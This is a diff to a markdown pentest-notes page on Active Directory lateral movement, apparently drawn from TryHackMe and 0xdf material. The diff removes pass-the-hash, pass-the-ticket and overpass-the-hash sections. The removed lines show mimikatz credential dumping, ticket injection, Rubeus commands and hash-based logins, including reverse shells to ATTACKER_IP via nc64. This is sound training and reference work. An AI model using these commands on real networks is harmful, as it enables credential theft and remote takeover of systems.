@@ -4,7 +4,7 @@ type: technique
 tags: [0xdf, active-directory, kerberos, lateral-movement, pass-the-hash, post-exploitation, thm, windows]
 phase: post-exploitation
 date_created: 2026-05-08
-date_updated: 2026-05-13
+date_updated: 2026-09-10
 sources: [thm-ad-lateral, 0xdf-windows-ad, hacktricks-windows]
 ---
 
@@ -191,43 +191,7 @@ Detection: shells parented by `mmc.exe`, an Office app, or `explorer.exe`; DCOM 
 
 ### Pass-the-Hash (NTLM)
 
-Extract hashes from SAM (local users only):
-```
-mimikatz # privilege::debug
-mimikatz # token::elevate
-mimikatz # lsadump::sam
-```
-
-Extract hashes from LSASS memory (domain users who have logged on):
-```
-mimikatz # privilege::debug
-mimikatz # token::elevate
-mimikatz # sekurlsa::msv
-```
-
-Inject a hash to impersonate a user (spawns new process with the victim's token):
-```
-mimikatz # token::revert
-mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"nc64.exe -e cmd.exe ATTACKER_IP 5555"
-```
-
-From Linux — PtH with various tools:
-```bash
-# RDP
-xfreerdp /v:TARGET_IP /u:DOMAIN\\user /pth:NTLM_HASH
-
-# PsExec (Linux version supports PtH; Windows version does not)
-psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
-
-# WinRM
-evil-winrm -i TARGET_IP -u user -H NTLM_HASH
-
-# WMIExec
-wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
-
-# SMBExec
-smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
-```
+The technique mechanics live in [[pass-the-hash]].
 
 ### Headless RDP command execution (RDP-only foothold)
 
@@ -267,45 +231,11 @@ netexec smb TARGET_IP -u user -H NTLM_HASH
 
 ### Pass-the-Ticket (Kerberos)
 
-Extract all tickets from LSASS (requires SYSTEM):
-```
-mimikatz # privilege::debug
-mimikatz # sekurlsa::tickets /export
-```
-
-Inject a specific ticket into the current session (no admin required):
-```
-mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
-```
-
-Verify loaded tickets:
-```cmd
-klist
-```
-
-Using Rubeus to request a TGT and inject it:
-```cmd
-Rubeus.exe asktgt /user:Administrator /password:Mypass123 /ptt
-```
+The technique mechanics live in [[pass-the-hash]].
 
 ### Overpass-the-Hash / Pass-the-Key
 
-When RC4 is enabled, the NTLM hash equals the RC4 Kerberos key — use it to request a TGT:
-```
-mimikatz # sekurlsa::ekeys    # dump all Kerberos encryption keys
-```
-
-Request a TGT using different key types:
-```
-# RC4 (NTLM hash works here)
-mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"nc64.exe -e cmd.exe ATTACKER_IP 5556"
-
-# AES128
-mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"nc64.exe -e cmd.exe ATTACKER_IP 5556"
-
-# AES256
-mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:<key> /run:"nc64.exe -e cmd.exe ATTACKER_IP 5556"
-```
+The technique mechanics live in [[pass-the-hash]].
 
 ## Bypasses and Variants
 
